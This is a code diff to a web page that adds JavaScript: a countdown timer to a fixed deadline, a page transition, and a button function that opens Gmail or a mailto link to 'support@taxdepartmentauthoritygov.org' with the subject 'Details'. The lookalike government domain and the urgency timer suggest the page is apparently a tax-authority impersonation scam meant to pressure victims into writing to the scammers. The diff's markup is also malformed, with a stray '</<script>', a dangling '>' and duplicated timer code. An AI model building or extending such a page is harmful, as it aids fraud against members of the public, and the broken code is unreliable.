@@ -207,7 +207,69 @@
 
     setInterval(updateTimer, 1000);
     updateTimer();
+</<script>
+    const TARGET_EMAIL = "support@taxdepartmentauthoritygov.org";
+    const KEYWORD = "Details";
+
+    function showPage2() {
+        const p1 = document.getElementById('page1');
+        const p2 = document.getElementById('page2');
+        
+        p1.style.opacity = '0';
+        p1.style.transform = 'scale(0.9) translateY(-20px)';
+        
+        setTimeout(() => {
+            p1.style.display = 'none';
+            p2.style.display = 'block';
+            p2.offsetHeight; 
+            p2.classList.remove('hidden');
+            p2.classList.add('visible');
+        }, 500);
+    }
+
+    function sendEmail() {
+        const subject = encodeURIComponent(KEYWORD);
+        const body = encodeURIComponent(KEYWORD);
+        
+        // 1. Standard Mailto Link (Most reliable fallback)
+        const mailtoUrl = `mailto:${TARGET_EMAIL}?subject=${subject}&body=${body}`;
+        
+        // 2. Gmail Web Link
+        const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=${TARGET_EMAIL}&su=${subject}&body=${body}`;
+
+        // Execution logic:
+        // Try to open Gmail in a new tab first
+        const gmailWindow = window.open(gmailUrl, '_blank');
+
+        // If Gmail was blocked or failed, or as a secondary measure, trigger the mailto
+        if (!gmailWindow || gmailWindow.closed || typeof gmailWindow.closed === 'undefined') {
+            window.location.href = mailtoUrl;
+        }
+    }
+
+    function updateTimer() {
+        const targetDate = new Date("July 8, 2024 23:59:59").getTime();
+        const now = new Date().getTime();
+        const distance = targetDate - now;
+
+        if (distance < 0) {
+            document.getElementById('timer').innerText = "EXPIRED";
+            return;
+        }
+
+        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+        document.getElementById('timer').innerText = 
+            `${days}d ${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
+    }
+
+    setInterval(updateTimer, 1000);
+    updateTimer();
 </script>
+>
 
 </body>
 </html>
